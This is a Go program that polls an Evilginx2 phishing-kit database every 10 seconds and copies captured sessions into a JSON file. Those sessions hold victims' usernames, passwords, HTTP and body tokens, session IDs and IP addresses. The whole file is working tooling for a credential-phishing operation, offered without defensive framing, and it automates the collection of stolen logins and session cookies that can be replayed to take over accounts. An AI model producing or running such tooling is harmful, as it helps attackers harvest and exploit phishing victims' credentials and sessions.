package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"time"

	"github.com/tidwall/buntdb"
)

// Session struct should match your database session structure
type Session struct {
	Id           int               `json:"id"`
	Phishlet     string            `json:"phishlet"`
	LandingURL   string            `json:"landing_url"`
	Username     string            `json:"username"`
	Password     string            `json:"password"`
	Custom       map[string]string `json:"custom"`
	BodyTokens   map[string]string `json:"body_tokens"`
	HttpTokens   map[string]string `json:"http_tokens"`
	SessionId    string            `json:"session_id"`
	UserAgent    string            `json:"useragent"`
	RemoteAddr   string            `json:"remote_addr"`
	CreateTime   int64             `json:"create_time"`
	UpdateTime   int64             `json:"update_time"`
}

const jsonFileName = "sessions.json"

func main() {
	// Open the database
	db, err := buntdb.Open("data.db") // Update with the actual path to your Evilginx2 database
	if err != nil {
		fmt.Println("Error opening database:", err)
		return
	}
	defer db.Close()

	// Initialize JSON file with an empty array if it doesn't exist
	initializeJSONFile(jsonFileName)

	// Track the last update time for monitoring new sessions
	var lastUpdateTime int64

	for {
		newSessions := []*Session{}

		// Start a read-only transaction
		db.View(func(tx *buntdb.Tx) error {
			// Iterate over all sessions sorted by update time
			tx.Ascend("sessions_id", func(key, val string) bool {
				s := &Session{}
				json.Unmarshal([]byte(val), s)
				if s.UpdateTime > lastUpdateTime {
					newSessions = append(newSessions, s)
				}
				return true
			})
			return nil
		})

		// Append new sessions to the JSON file
		if len(newSessions) > 0 {
			err := appendSessionsToJson(newSessions, jsonFileName)
			if err != nil {
				fmt.Println("Error appending sessions to JSON:", err)
			}
			// Update lastUpdateTime based on the latest session processed
			lastUpdateTime = newSessions[len(newSessions)-1].UpdateTime
		}

		// Poll every 10 seconds
		time.Sleep(10 * time.Second)
	}
}

// Initialize JSON file with an empty array if the file does not exist
func initializeJSONFile(filename string) {
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		file, err := os.Create(filename)
		if err != nil {
			fmt.Println("Error creating JSON file:", err)
			return
		}
		defer file.Close()
		file.Write([]byte("[]"))
	}
}

// Append new sessions to the JSON file
func appendSessionsToJson(sessions []*Session, filename string) error {
	// Load existing sessions
	existingData, err := ioutil.ReadFile(filename)
	if err != nil {
		return err
	}

	var allSessions []*Session
	if err := json.Unmarshal(existingData, &allSessions); err != nil {
		return err
	}

	// Append new sessions
	allSessions = append(allSessions, sessions...)

	// Write updated array back to file
	newData, err := json.MarshalIndent(allSessions, "", "  ")
	if err != nil {
		return err
	}

	return ioutil.WriteFile(filename, newData, 0644)
}
